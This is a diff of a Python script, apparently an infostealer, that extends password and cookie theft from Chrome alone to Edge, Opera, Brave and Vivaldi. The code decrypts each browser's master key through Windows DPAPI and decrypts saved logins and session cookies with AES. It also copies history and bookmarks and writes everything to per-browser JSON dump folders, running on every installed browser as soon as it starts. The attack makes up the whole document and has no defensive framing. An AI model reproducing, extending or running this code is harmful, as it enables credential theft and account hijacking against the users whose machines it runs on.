@@ -9,15 +9,38 @@ from Crypto.Cipher import AES
 import win32crypt
 import datetime
 
-chrome_user_data_path = os.path.join(
-    os.environ['SYSTEMDRIVE'] + '\\Users',
-    getpass.getuser(),
-    "AppData", "Local", "Google", "Chrome", "User Data"
-)
+# Dictionary containing paths to user data for different browsers
+browser_data_paths = {
+    "chrome": os.path.join(
+        os.environ['SYSTEMDRIVE'] + '\\Users',
+        getpass.getuser(),
+        "AppData", "Local", "Google", "Chrome", "User Data"
+    ),
+    "edge": os.path.join(
+        os.environ['SYSTEMDRIVE'] + '\\Users',
+        getpass.getuser(),
+        "AppData", "Local", "Microsoft", "Edge", "User Data"
+    ),
+    "opera": os.path.join(
+        os.environ['SYSTEMDRIVE'] + '\\Users',
+        getpass.getuser(),
+        "AppData", "Roaming", "Opera Software", "Opera Stable"
+    ),
+    "brave": os.path.join(
+        os.environ['SYSTEMDRIVE'] + '\\Users',
+        getpass.getuser(),
+        "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"
+    ),
+    "vivaldi": os.path.join(
+        os.environ['SYSTEMDRIVE'] + '\\Users',
+        getpass.getuser(),
+        "AppData", "Local", "Vivaldi", "User Data"
+    )
+}
 
-def save_to_file(filename, data):
+def save_to_file(browser_name, filename, data):
     COMPUTER_NAME = os.environ['COMPUTERNAME']
-    folder_path = os.path.join("dumps", COMPUTER_NAME, "chrome")
+    folder_path = os.path.join("dumps", COMPUTER_NAME, browser_name)
 
     # Create the folder if it doesn't exist
     if not os.path.exists(folder_path):
@@ -35,8 +58,8 @@ def copy_db_file(src_path):
     shutil.copy2(src_path, dest_path)
     return dest_path
 
-def extract_encrypted_key():
-    local_state_path = os.path.join(chrome_user_data_path, "Local State")
+def extract_encrypted_key(browser_data_path):
+    local_state_path = os.path.join(browser_data_path, "Local State")
 
     with open(local_state_path, 'r') as file:
         local_state = file.read()
@@ -46,11 +69,11 @@ def extract_encrypted_key():
     encrypted_key = encrypted_key[5:]  # Remove DPAPI
     return encrypted_key
 
-def decrypt_passwords():
-    encrypted_key = extract_encrypted_key()
+def decrypt_passwords(browser_name, browser_data_path):
+    encrypted_key = extract_encrypted_key(browser_data_path)
     decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
-    chrome_path_login_db = os.path.join(chrome_user_data_path, "Default", "Login Data")
+    chrome_path_login_db = os.path.join(browser_data_path, "Default", "Login Data")
     login_db_temp_path = copy_db_file(chrome_path_login_db)
 
     conn = sqlite3.connect(login_db_temp_path)
@@ -80,16 +103,16 @@ def decrypt_passwords():
                 except Exception as e:
                     print("An error occurred:", str(e))
 
-    save_to_file('passwords.json', decrypted_logins)
+    save_to_file(browser_name, 'passwords.json', decrypted_logins)
 
     conn.close()
     os.remove(login_db_temp_path)
 
-def decrypt_cookies():
-    encrypted_key = extract_encrypted_key()
+def decrypt_cookies(browser_name, browser_data_path):
+    encrypted_key = extract_encrypted_key(browser_data_path)
     decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
-    chrome_path_cookie_db = os.path.join(chrome_user_data_path, "Default", "Network", "Cookies")
+    chrome_path_cookie_db = os.path.join(browser_data_path, "Default", "Network", "Cookies")
     cookie_db_temp_path = copy_db_file(chrome_path_cookie_db)
 
     conn = sqlite3.connect(cookie_db_temp_path)
@@ -124,13 +147,13 @@ def decrypt_cookies():
                 except Exception as e:
                     print("An error occurred:", str(e))
 
-    save_to_file('cookies.json', decrypted_cookies)
+    save_to_file(browser_name, 'cookies.json', decrypted_cookies)
 
     conn.close()
     os.remove(cookie_db_temp_path)
 
-def extract_history():
-    chrome_path_history_db = os.path.join(chrome_user_data_path, "Default", "History")
+def extract_history(browser_name, browser_data_path):
+    chrome_path_history_db = os.path.join(browser_data_path, "Default", "History")
     history_db_temp_path = copy_db_file(chrome_path_history_db)
 
     conn = sqlite3.connect(history_db_temp_path)
@@ -153,13 +176,13 @@ def extract_history():
             "Last Visit Time": last_visit_time.isoformat(),
         })
     
-    save_to_file('history.json', history)
+    save_to_file(browser_name, 'history.json', history)
 
     conn.close()
     os.remove(history_db_temp_path)
 
-def extract_bookmarks():
-    chrome_path_bookmarks = os.path.join(chrome_user_data_path, "Default", "Bookmarks")
+def extract_bookmarks(browser_name, browser_data_path):
+    chrome_path_bookmarks = os.path.join(browser_data_path, "Default", "Bookmarks")
 
     with open(chrome_path_bookmarks, 'r', encoding='utf-8') as file:
         bookmarks = json.load(file)
@@ -168,9 +191,14 @@ def extract_bookmarks():
     if 'sync_metadata' in bookmarks:
         del bookmarks['sync_metadata']
 
-    save_to_file('bookmarks.json', bookmarks)
+    save_to_file(browser_name, 'bookmarks.json', bookmarks)
 
-decrypt_passwords()
-decrypt_cookies()
-extract_history()
-extract_bookmarks()
+for browser_name, browser_data_path in browser_data_paths.items():
+    if os.path.exists(browser_data_path):
+        print(f"Extracting data from {browser_name.capitalize()}...")
+        decrypt_passwords(browser_name, browser_data_path)
+        decrypt_cookies(browser_name, browser_data_path)
+        extract_history(browser_name, browser_data_path)
+        extract_bookmarks(browser_name, browser_data_path)
+    else:
+        print(f"{browser_name.capitalize()} is not installed or the path is incorrect.")
